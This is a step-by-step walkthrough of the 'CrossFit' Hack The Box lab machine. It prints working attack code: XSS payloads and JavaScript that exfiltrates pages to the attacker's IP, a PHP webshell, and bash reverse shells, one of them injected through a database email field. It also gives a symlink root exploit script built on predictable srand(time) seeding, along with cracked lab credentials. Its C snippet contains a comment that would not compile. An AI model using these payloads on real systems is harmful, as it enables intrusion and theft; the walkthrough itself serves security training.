# Hack The Box — CrossFit Walkthrough
## Comprehensive Step-by-Step Guide with Hacker Mindset

---

## Machine Info
| Field | Value |
|-------|-------|
| **Name** | CrossFit |
| **OS** | Linux |
| **Difficulty** | Insane |
| **IP** | 10.129.5.198 |
| **Flags** | User: `f82ecf3f[redacted]383717c6e` / Root: `201d921[redacted]0d2d11a3` |

---

## Table of Contents
1. [Phase 0: Reconnaissance](#phase-0-reconnaissance)
2. [Phase 1: The XSS Vector](#phase-1-the-xss-vector)
3. [Phase 2: CORS Subdomain Enumeration](#phase-2-cors-subdomain-enumeration)
4. [Phase 3: CSRF Account Creation](#phase-3-csrf-account-creation)
5. [Phase 4: FTP Webshell & Foothold](#phase-4-ftp-webshell--foothold)
6. [Phase 5: User Escalation (www-data → hank)](#phase-5-user-escalation-www-data--hank)
7. [Phase 6: Lateral Movement (hank → isaac)](#phase-6-lateral-movement-hank--isaac)
8. [Phase 7: Root Escalation (isaac → root)](#phase-7-root-escalation-isaac--root)
9. [Key Lessons & Hacker Mindset Summary](#key-lessons--hacker-mindset-summary)

---

## Phase 0: Reconnaissance

### Step 0.1: Add Domains to /etc/hosts

```bash
sudo bash -c 'echo "10.129.5.198 crossfit.htb gym-club.crossfit.htb ftp.crossfit.htb development-test.crossfit.htb" >> /etc/hosts'
```

**Why this matters:**  
Web servers often use **virtual hosts** to serve different content based on the `Host` header. Accessing the site by IP alone usually yields a default Apache page. By mapping the domain names, we ensure our browser and tools send the correct `Host` header, revealing the actual applications.

**Hacker Mindset:**  
> *"Never trust the IP address alone. Modern web infrastructure is built on named virtual hosts. The same IP can host dozens of applications. Enumeration of vhosts is not optional — it's foundational."*

---

### Step 0.2: Nmap Scan

```bash
nmap -p- --min-rate 10000 10.129.5.198
nmap -p 21,22,80 -sC -sV 10.129.5.198
```

**Results:**
- **Port 21** — FTP (vsftpd, requires TLS)
- **Port 22** — SSH (OpenSSH 7.9p1)
- **Port 80** — HTTP (Apache 2.4.38)

**Why this matters:**  
The SSL certificate on port 21 leaks critical domain information: `CN=*.crossfit.htb` and `emailAddress=info@gym-club.crossfit.htb`. This tells us there are subdomains before we even start brute-forcing.

**Hacker Mindset:**  
> *"Every service banner, every certificate field, every error message is a potential leak. The certificate is not just for encryption — it's an information disclosure vector. Read every field."*

---

## Phase 1: The XSS Vector

### Step 1.1: Discover the XSS Trigger

Visit `http://gym-club.crossfit.htb/blog-single.php`. There is a comment form. Submit a comment containing:
```html
<script>alert(1)</script>
```

The site responds with:
> "XSS attempt detected. A security report containing your IP address and browser information will be generated and our admin team will be immediately notified."

**Why this matters:**  
The message explicitly tells us two things: (1) there is an admin bot that reviews reports, and (2) the report includes **browser information** (i.e., the User-Agent string). If the admin bot renders the report in a browser, and our User-Agent contains JavaScript, the admin bot will execute our code.

**Hacker Mindset:**  
> *"When a target tells you exactly what it's doing, believe it. 'Browser information will be sent to admins' is not a warning — it's a roadmap. The User-Agent is attacker-controlled input that reaches the admin's browser. That's XSS."*

---

### Step 1.2: Confirm the XSS via User-Agent

Start a Python HTTP server to catch the admin bot's request:

```bash
cd /tmp && python3 -m http.server 80
```

Send the XSS payload in the **User-Agent** header:

```bash
curl -s http://gym-club.crossfit.htb/blog-single.php \
  --data 'name=test&email=test@crossfit.htb&phone=9999999999&message=<script src="http://10.10.16.84/"></script>&submit=submit' \
  -H 'User-Agent: <script src="http://10.10.16.84/"></script>'
```

**What happens:**  
1. The `<script>` in the comment body triggers the XSS detector.
2. A security report is generated and sent to the admin team.
3. The report includes our malicious User-Agent.
4. The admin bot (a headless Firefox/Selenium browser) renders the report page.
5. The `<script>` in the User-Agent executes, causing the bot to fetch `http://10.10.16.84/`.

**Confirmation:**
```
10.129.5.198 - - [29/May/2026 15:01:41] "GET / HTTP/1.1" 200 -
```

**Hacker Mindset:**  
> *"Input validation on the message body is irrelevant if another field reaches the same sink. Always ask: 'What other attacker-controlled data reaches the victim?' The User-Agent, Referer, and even custom headers can be XSS vectors when reflected in admin dashboards."*

---

## Phase 2: CORS Subdomain Enumeration

### Step 2.1: Discover Internal Subdomains

The `gym-club.crossfit.htb` site has CORS headers. If we send an `Origin: http://FUZZ.crossfit.htb` header, the server responds with `Access-Control-Allow-Origin` only for valid subdomains.

**Why this matters:**  
The server is telling us which subdomains exist by explicitly allowing them in CORS. This is passive subdomain enumeration — no brute-force needed.

```bash
wfuzz -u http://gym-club.crossfit.htb/ -H "Origin: http://FUZZ.crossfit.htb" \
  --filter "r.headers.response ~ 'Access-Control-Allow-Origin'" \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
```

**Result:** `ftp.crossfit.htb`

**Hacker Mindset:**  
> *"CORS is not just a security policy — it's an enumeration mechanism. If `gym-club` trusts `ftp.crossfit.htb`, then `ftp.crossfit.htb` must exist. Trust relationships are discovery relationships."*

---

### Step 2.2: Exfiltrate the Internal Page

Accessing `ftp.crossfit.htb` from our machine returns the default Apache page. But the admin bot is on the internal network and sees the real application. We use XSS to make the bot fetch the page for us.

Create `/tmp/ftp_enum.js`:
```javascript
var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if(fetch_req.readyState == XMLHttpRequest.DONE) {
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("POST", "http://10.10.16.84:3000", false);
        exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
    }
};
fetch_req.open("GET", "http://ftp.crossfit.htb/", false);
fetch_req.withCredentials = true;
fetch_req.send();
```

Host it on port 80 and catch the exfil on port 3000:
```bash
nc -lnkp 3000  # Terminal B
cd /tmp && python3 -m http.server 80  # Terminal A
```

Trigger the XSS:
```bash
curl -s http://gym-club.crossfit.htb/blog-single.php \
  --data 'name=test&email=test@crossfit.htb&phone=9999999999&message=<script src="http://10.10.16.84/"></script>&submit=submit' \
  -H 'User-Agent: <script src="http://10.10.16.84/ftp_enum.js"></script>'
```

**Result:** The internal page is an **FTP Account Management** portal with a "Create New Account" button.

**Hacker Mindset:**  
> *"Internal applications are not hidden — they're just not visible to outsiders. If you can make an insider (the admin bot) browse for you, internal becomes external. The browser is the ultimate SSRF engine."*

---

## Phase 3: CSRF Account Creation

### Step 3.1: Understand the CSRF Protection

The `/accounts/create` form contains a Laravel CSRF token:
```html
<input type="hidden" name="_token" value="...">
```

**Why this matters:**  
We cannot simply POST to `/accounts` with hardcoded credentials. The server validates the `_token` against the session. However, since our JavaScript runs in the admin bot's browser, it shares the admin's session cookies. We can:
1. GET `/accounts/create` to extract the token
2. POST to `/accounts` with the valid token + our credentials

**Hacker Mindset:**  
> *"CSRF tokens are session-bound, not user-bound. If your code runs in the victim's browser with their cookies, you ARE the victim. XSS is the ultimate CSRF bypass because it inherits the victim's entire session state."*

---

### Step 3.2: Create the FTP Account

Create `/tmp/ftp_create_account.js`:
```javascript
function get_token(body) {
    var dom = new DOMParser().parseFromString(body, 'text/html');
    return dom.getElementsByName('_token')[0].value;
}

var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if (fetch_req.readyState == XMLHttpRequest.DONE) {
        var token = get_token(fetch_req.response);

        var reg_req = new XMLHttpRequest();
        reg_req.onreadystatechange = function() {
            if (reg_req.readyState == XMLHttpRequest.DONE) {
                var exfil_req = new XMLHttpRequest();
                exfil_req.open("POST", "http://10.10.16.84:3000/", false);
                exfil_req.send(reg_req.response);
            }
        };
        reg_req.open("POST", "http://ftp.crossfit.htb/accounts", false);
        reg_req.withCredentials = true;
        reg_req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        reg_req.send("_token=" + token + "&username=rapid99&pass=rapid99");
    }
};

fetch_req.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
fetch_req.withCredentials = true;
fetch_req.send();
```

**Critical detail:** `withCredentials = true` ensures cookies are sent with cross-origin requests. Without this, the CSRF token would be rejected because the session would be different.

Trigger the XSS and confirm: **"Account created successfully."**

**Hacker Mindset:**  
> *"Never assume a form is secure just because it has a token. The token is a lock, but XSS is the key. If you can execute JavaScript in the authenticated session, you can read any page, extract any token, and submit any form."*

---

## Phase 4: FTP Webshell & Foothold

### Step 4.1: Connect to FTP

Standard `ftp` fails because the server requires encryption:
```
530 Non-anonymous sessions must use encryption.
```

Use `lftp` with SSL verification disabled:
```bash
lftp -u rapid99,rapid99 ftp.crossfit.htb -e "set ssl:verify-certificate false; ls"
```

**Directories:**
- `development-test` — writable by FTP users
- `ftp` — the Laravel FTP management app
- `gym-club` — the main website
- `html` — default Apache page

**Why this matters:**  
`development-test` is writable and mapped to a virtual host (`development-test.crossfit.htb`). If we upload a PHP shell here, we can execute it via HTTP.

**Hacker Mindset:**  
> *"Writable directories in web roots are gold. Always check permissions. A directory that allows PUT/POST is a code execution waiting to happen."*

---

### Step 4.2: Upload the Webshell

Create a minimal PHP command shell:
```php
<?php system($_GET['cmd']); ?>
```

Upload it:
```bash
lftp -u rapid99,rapid99 ftp.crossfit.htb -e "set ssl:verify-certificate false; cd development-test; put cmd.php; ls; quit"
```

**Hacker Mindset:**  
> *"Simplicity wins. A one-line PHP shell is often better than a massive reverse shell payload because it's stealthy, reliable, and works through firewalls. We can always upgrade later."*

---

### Step 4.3: Trigger the Reverse Shell

The webshell is reachable at `http://development-test.crossfit.htb/cmd.php`, but only from the internal network (the admin bot). We use XSS one more time to trigger it.

Create `/tmp/revshell.js`:
```javascript
var req = new XMLHttpRequest();
req.open("GET", "http://development-test.crossfit.htb/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.84/443+0>%261'", false);
req.send();
```

Start the listener:
```bash
nc -lnkp 443
```

Trigger the XSS with the revshell payload in the User-Agent.

**Result:** Shell as `www-data`.

**Upgrade the shell:**
```bash
python3 -c 'import pty;pty.spawn("bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter
reset
# Terminal type: screen
```

**Hacker Mindset:**  
> *"Chaining is the essence of advanced exploitation. XSS → CSRF → FTP → Webshell → Reverse Shell. Each link is simple; the chain is powerful. Never stop at the first win — ask 'what can I do NOW that I couldn't do before?'"*

---

## Phase 5: User Escalation (www-data → hank)

### Step 5.1: Find the Ansible Playbook

While enumerating as `www-data`, discover:
```bash
cat /etc/ansible/playbooks/adduser_hank.yml
```

It contains a SHA512crypt password hash for user `hank`:
```
$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
```

**Why this matters:**  
Ansible playbooks are automation scripts. They often contain hardcoded credentials because they need to provision systems unattended. Always check `/etc/ansible/`.

**Hacker Mindset:**  
> *"DevOps credentials are the new domain admin hashes. Ansible, Puppet, Chef, and SaltStack all store secrets in plaintext or weakly hashed forms. Check them religiously."*

---

### Step 5.2: Crack the Hash

Save the hash and crack it:
```bash
hashcat -m 1800 hank.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `powerpuffgirls`

**Hacker Mindset:**  
> *"SHA512crypt ($6$) looks scary, but it's just a password hash. Given a good wordlist and modern GPUs, most human-chosen passwords fall in minutes. Never assume a hash is uncrackable — always try."*

---

### Step 5.3: Become hank

```bash
su hank -
# Password: powerpuffgirls
cat ~/user.txt
```

**User flag:** `f82ecf[redacted]23a383717c6e`

---

## Phase 6: Lateral Movement (hank → isaac)

### Step 6.1: Enumerate as hank

Check groups:
```bash
id
# uid=1004(hank) gid=1006(hank) groups=1006(hank),1005(admins)
```

The `admins` group grants read access to:
- `/home/isaac/send_updates`
- `/etc/pam.d/vsftpd` (contains `ftpadm` credentials)

Read the PAM config:
```bash
grep pam_mysql /etc/pam.d/vsftpd
```

**Result:** `ftpadm` / `8W)}gpRJvAmnb`

Read the gym-club database credentials:
```bash
cat /var/www/gym-club/db.php
```

**Result:** `crossfit` / `oeLoo~y2baeni`

**Hacker Mindset:**  
> *"Group memberships are privilege boundaries. Being in 'admins' is not just a label — it's a key to other users' data. Always run `id`, `groups`, and `find / -group YOURGROUP`."*

---

### Step 6.2: Understand the Cron Job

```bash
cat /etc/crontab
```

Line:
```
*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php
```

This script runs **every minute as isaac**. It reads files from `/srv/ftp/messages` and sends emails to all users in the `users` database table using the `mikehaertl/php-shellcommand` library (version 1.6.0).

**Vulnerability:**  
Version 1.6.0 has a command injection flaw. The `email` field from the database is passed as an argument to `/usr/bin/mail` without proper escaping.

**Why the file upload is needed:**  
The inner loop only runs if there are files in `/srv/ftp/messages`. We must upload any file there via FTP to trigger the mail loop.

**Hacker Mindset:**  
> *"Cron jobs are persistence mechanisms for attackers. A script that runs every minute as another user is a free escalator — if you can influence its inputs. Always read crontab and trace the data flow."*

---

### Step 6.3: Execute the Command Injection

Start a listener:
```bash
nc -lnkp 4444
```

Insert the malicious email into the database:
```bash
mysql -u crossfit -poeLoo~y2baeni crossfit \
  -e "INSERT INTO users(email) VALUES ('--wrong || bash -c \"bash -i >& /dev/tcp/10.10.16.84/4444 0>&1\"')"
```

Upload any file to `/srv/ftp/messages` via FTP to trigger the mail loop:
```bash
lftp -u ftpadm,'8W)}gpRJvAmnb' ftp.crossfit.htb \
  -e "set ssl:verify-certificate false; cd messages; put /etc/hostname; quit"
```

**Wait up to 60 seconds** for the cron to fire.

**Result:** Shell as `isaac`.

**Why the payload works:**  
The `send_updates.php` script builds a command like:
```
/usr/bin/mail -s 'CrossFit Club Newsletter' '--wrong || bash -c "bash -i >& /dev/tcp/10.10.16.84/4444 0>&1"'
```

Due to the php-shellcommand escaping flaw, the shell interprets `||` and executes our reverse shell.

**Hacker Mindset:**  
> *"Command injection isn't always about direct user input. Sometimes the payload sits in a database, waiting for a cron job to retrieve it. The database is just storage; the execution context is what matters."*

---

## Phase 7: Root Escalation (isaac → root)

### Step 7.1: Discover the dbmsg Binary

While running `pspy` (or observing file events), notice `/bin/dbmsg` being accessed every minute. Running it directly fails:
```bash
dbmsg
# This program must be run as root.
```

**Why this matters:**  
A binary that explicitly checks for root and runs on a cron is the ultimate target for privilege escalation.

**Hacker Mindset:**  
> *"Binaries that say 'must be run as root' are not barriers — they're advertisements. They tell you exactly what they're for. Your job is to figure out how to make root run YOUR data through them."*

---

### Step 7.2: Reverse Engineering dbmsg

Analyzing `dbmsg` in Ghidra reveals:

```c
void main(void) {
  uid = geteuid();
  if (uid != 0) {
    fwrite("This program must be run as root.\n",1,0x22,stderr);
    exit(1);
  }
  time_seed = time((time_t *)0x0);
  srand((uint)time_seed);
  process_data();
  exit(0);
}
```

The `process_data()` function:
1. Connects to MySQL as `crossfit`/`oeLoo~y2baeni`
2. Queries `SELECT * FROM messages`
3. Opens `/var/backups/mariadb/comments.zip`
4. For each row:
   - `rand_num = rand()`
   - `filename = md5(rand_num + id)`
   - `filepath = "/var/local/" + filename`
   - `fopen(filepath, "w")`
   - Writes: `name + " " + message + " " + email`
   - Adds file to zip
5. Deletes DB rows and files

**The Exploit:**  
Since `srand(time(NULL))` uses the current Unix timestamp as the seed, the "random" number is **predictable**. We can:
1. Calculate the timestamp when `dbmsg` will next run (every minute at :01)
2. Predict `rand()` for that timestamp
3. Compute the MD5 hash of `rand() + id`
4. Create a **symlink** at `/var/local/[hash]` pointing to `/root/.ssh/authorized_keys`
5. Insert our SSH public key into the `messages` table with the matching `id`
6. When `dbmsg` runs as root, it `fopen()`s our symlink, follows it, and writes our SSH key to `/root/.ssh/authorized_keys`

**Hacker Mindset:**  
> *"Randomness seeded with time is not random — it's a clock. If you know when a program runs, you know its entropy source. Cryptographers call this a catastrophic failure; attackers call it Tuesday."*

---

### Step 7.3: Generate an SSH Key Pair

On Kali:
```bash
ssh-keygen -t ed25519 -f /tmp/crossfit_root -N "" -C "root@crossfit"
cat /tmp/crossfit_root.pub
```

**Result:**
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF5APNQ6KSHyFeATLDm52mK+EIOmslITWWsGzcu9oMGx root@crossfit
```

---

### Step 7.4: Build and Run the Exploit Script

On the target (as `isaac`), create `/home/isaac/root.sh`:

```bash
#!/bin/bash

ID=777
cd /home/isaac

# Predict dbmsg's rand() seed
cat > predict.c <<'EOF'
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
int main() {
    time_t now = time(NULL);
    time_t next = now - (now % 60) + 61;  # Next minute + 1 second
    srand(next);
    printf("%d\n", rand());
    return 0;
}
EOF

gcc -o predict predict.c
RAND=$(./predict)
rm predict predict.c

# Compute the target filename
FN=$(echo -n "${RAND}${ID}" | md5sum | cut -d' ' -f1)
echo "[+] Predicted filename: /var/local/$FN"

# Create symlink before dbmsg runs
ln -sf /root/.ssh/authorized_keys /var/local/$FN
echo "[+] Symlink created"

# Insert SSH key parts into messages table
# dbmsg writes: name + " " + message + " " + email
# For authorized_keys format: ssh-ed25519 <key> <comment>
mysql -u crossfit -poeLoo~y2baeni crossfit \
  -e "INSERT INTO messages(id, name, email, message) VALUES ($ID, 'ssh-ed25519', 'root@crossfit', 'AAAAC3NzaC1lZDI1NTE5AAAAIF5APNQ6KSHyFeATLDm52mK+EIOmslITWWsGzcu9oMGx')"
echo "[+] DB entry inserted"

# Sleep until dbmsg runs (next minute :01)
SECS=$((61 - $(date +%-S)))
echo "[*] Sleeping $SECS seconds until dbmsg runs..."
sleep $SECS

echo "[*] Exploit window passed. Try SSH as root."
```

Run it:
```bash
chmod +x /home/isaac/root.sh
/home/isaac/root.sh
```

**Critical timing note:**  
A cleanup script on the box periodically deletes files in `/tmp`, `/dev/shm`, and `/var/local`. We compile in `/home/isaac` and create the symlink in `/var/local` just before the cron fires. If the symlink is cleaned before `dbmsg` opens it, the exploit fails. The sleep targets the exact execution window.

---

### Step 7.5: SSH as Root

On Kali:
```bash
ssh -i /tmp/crossfit_root root@10.129.5.198
```

**Result:**
```
root@crossfit:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**
```bash
cat /root/root.txt
# 201d921[redacted]0d2d11a3
```

**Hacker Mindset:**  
> *"Arbitrary write as root is game over. It doesn't matter how complex the path is — if root writes attacker-controlled data to an attacker-chosen location, you own the box. The symlink turns a benign file write into a root compromise."*

---

## Key Lessons & Hacker Mindset Summary

### 1. Input Fields Are Not Created Equal
The blog comment form had XSS filters. The User-Agent did not. **Every field that reaches a privileged viewer is an attack surface.**

### 2. The Browser Is Your Best Friend
A headless browser running as an admin is not a security control — it's a proxy. XSS lets you browse the internal network, submit forms, and steal tokens from the inside.

### 3. CORS Is an Enumeration Tool
`Access-Control-Allow-Origin` leaks the existence of subdomains. Trust relationships are discovery vectors.

### 4. Chain Simple Primitives
XSS → CORS enumeration → CSRF → FTP upload → Webshell → Reverse shell. No single step is complex; the chain is devastating.

### 5. Credentials Hide in Config Files
Ansible playbooks, PAM configs, and PHP `db.php` files are credential goldmines. Automation requires hardcoded secrets.

### 6. Cron Jobs Are Escalation Paths
A script that runs every minute as another user is a free elevator. Find what inputs it consumes and poison them.

### 7. Predictable Randomness Is Not Random
`srand(time(NULL))` is a cryptographic disaster. If you know the execution time, you know the output.

### 8. Symlinks Redirect Privilege
A symlink in a world-writable directory can turn a low-privilege file creation into a high-privilege file write. Root follows symlinks.

### 9. Timing Matters
Cleanup scripts, cron jobs, and race conditions are real. The difference between success and failure is often seconds. Prepare everything in advance and execute rapidly.

### 10. Never Trust the Surface
The default Apache page on `crossfit.htb` was a lie. The real application lived on `gym-club.crossfit.htb`. The FTP site was invisible without the right `Origin` header. **What you see first is rarely what you need.**

---

*Happy hacking. The chain is only as strong as your curiosity.*
